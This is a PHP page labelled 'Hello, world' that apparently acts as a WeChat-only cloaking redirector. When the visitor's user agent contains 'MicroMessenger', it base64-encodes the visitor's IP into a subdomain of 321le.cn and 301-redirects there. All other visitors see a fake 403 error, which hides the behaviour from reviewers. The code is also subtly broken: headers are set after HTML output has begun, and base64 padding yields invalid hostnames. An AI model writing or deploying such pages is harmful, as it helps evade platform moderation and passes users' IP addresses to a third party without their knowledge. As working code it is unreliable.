<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>你好，世界</title>
</head>
<body>
    <?php
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    
    // 判断是否在微信环境中访问
    if (strpos($userAgent, 'MicroMessenger') !== false) {
        // 获取当前用户IP
        $userIp = $_SERVER['REMOTE_ADDR'];
        
        // 将IP转化为64位编码
        $encodedIp = base64_encode($userIp);
        
        // 拼接跳转URL
        $redirectUrl = 'http://' . $encodedIp . '.321le.cn';
        
        // 执行301重定向跳转
        header("HTTP/1.1 301 Moved Permanently");
        header("Location: $redirectUrl");
        exit();
    } else {
        // 非微信环境下显示403 Forbidden错误
        header("HTTP/1.1 403 Forbidden");
        echo "403 Forbidden";
        exit();
    }
    ?>
</body>
</html>


